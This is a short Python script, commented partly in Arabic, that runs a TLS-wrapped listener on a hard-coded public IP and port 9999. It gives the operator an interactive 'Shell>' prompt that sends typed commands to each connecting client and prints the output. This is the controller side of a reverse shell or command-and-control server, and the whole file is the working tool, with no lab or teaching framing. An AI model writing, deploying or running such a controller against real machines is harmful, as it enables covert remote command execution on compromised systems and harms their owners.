import os
import socket
import ssl
from threading import Thread

def start_server(ip, port=9999):
    """
    Start the TLS server for communication.
    """
    certfile = "/root/keys/server.crt"  # مسار شهادة السيرفر
    keyfile = "/root/keys/server.key"   # مسار مفتاح السيرفر

    # إعداد SSL
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=certfile, keyfile=keyfile)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((ip, port))
        server_socket.listen(5)
        print(f"[*] Server listening on {ip}:{port}")

        with context.wrap_socket(server_socket, server_side=True) as tls_server:
            while True:
                client_socket, addr = tls_server.accept()
                print(f"[+] Connection from {addr}")
                Thread(target=handle_client, args=(client_socket,)).start()

def handle_client(client_socket):
    """
    Handle client commands.
    """
    buffer_size = 8192
    try:
        while True:
            command = input("Shell> ")
            if command.lower() in ["exit", "quit"]:
                client_socket.sendall(b"exit")
                break
            client_socket.sendall(command.encode())
            response = client_socket.recv(buffer_size).decode()
            print(response)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client_socket.close()

if __name__ == "__main__":
    server_ip = "64.227.73.246"  # IP الخاص بالسيرفر
    start_server(server_ip, 9999)  # تشغيل السيرفر على المنفذ 9999
